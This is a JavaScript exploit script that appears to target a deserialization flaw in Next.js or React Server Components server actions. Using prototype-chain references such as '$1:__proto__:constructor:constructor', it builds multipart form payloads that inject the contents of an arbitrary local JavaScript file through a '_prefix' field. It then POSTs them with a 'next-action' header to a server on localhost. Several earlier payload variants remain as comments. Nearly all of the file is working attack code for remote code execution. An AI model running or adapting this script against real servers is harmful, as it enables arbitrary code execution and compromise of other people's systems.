import FormDataLib from 'form-data';
import fs from "fs";
import path from "path";

// const payload = {
//     '0': { then: '$1:__proto__:toString' },
//     //'0': {then: "$1:__proto__:constructor:constructor"},
//     '1': { 'x': '1' }
// }

// const payload = {
//    '0': ["$1"],
//    '1': "Hello, World"
// }

const port = process.argv[2] || 3000;

const filePath = process.argv[3] ?? "out.js";

// Resolve relative paths safely
const resolvedPath = path.resolve(process.cwd(), filePath);

let contents = 'console.log("hi")'
try {
  contents = fs.readFileSync(resolvedPath, "utf8");
  console.log(contents);
} catch (err) {
  console.error(`Failed to read file: ${resolvedPath}`);
  console.error(err.message);
  process.exit(1);
}

let payload = {
    '0': ['$1'],
    '1': {
        'id': 1,
        'name': '$2:config:name'
    },
    '2': {
        'config': {
            'name': 'Hi there!'
        }
    }
}

payload = {
    '0': ['$1:__proto__:constructor:constructor'],
    '1': {}
}


payload = {
    '0': {'then': '$1:__proto__:constructor:constructor'},
    '1': {'x': 1}
}


payload = {
    '0': {'then': '$1:__proto__:then', 'reason': 1},
    '1': '$@0'
}

// payload = {
//     '0': {'then': '$1:__proto__:then', 'status': 'resolved_model'},
//     '1': '$@0'
// }

// payload = {
//     '0': {
//         'then': '$1:__proto__:then', 
//         'status': 'resolved_model', 
//         'reason': -1,
//         'value': '"$B0"',
//         '_response': {
//             '_formData': {
//                 'get': '$0:constructor:constructor',
//             },
//             '_prefix': `console.log('hi')//`,
//         }
//     },
//     '1': '$@0'
// }

payload = {
    '0': {
        'then': '$1:__proto__:then', 
        'status': 'resolved_model', 
        'reason': -1,
        'value': '{ "then":"$B0" }',
        '_response': {
            '_formData': {
                'get': '$0:constructor:constructor',
            },
            '_prefix': `console.log('hi')//`,
        }
    },
    '1': '$@0'
}

payload = {
    '0': {
        'then': '$1:__proto__:then', 
        'status': 'resolved_model', 
        'reason': -1,
        'value': '{ "then":"$B0" }',
        '_response': {
            '_formData': {
                'get': '$0:constructor:constructor',
            },
            '_prefix': `${contents}//`, // payload here
        }
    },
    '1': '$@0'
}

const fd = new FormDataLib()

for (const key in payload) {
    fd.append(key, JSON.stringify(payload[key]))
}

console.log(fd.getBuffer().toString())

console.log(fd.getHeaders())

async function exploit(baseUrl) {
    const response = await fetch(baseUrl, {
        method: 'POST',
        headers: {
            'next-action': '40dd959a9ef43aa437aead0432f012903b75a3f380',
            // 'next-action': 'x',
            ...fd.getHeaders()
        },
        body: fd.getBuffer()
    });
    const text = await response.text();
    console.log(text);
}

// get the port from the command line arguments, default to 3000

exploit(`http://localhost:${port}/`)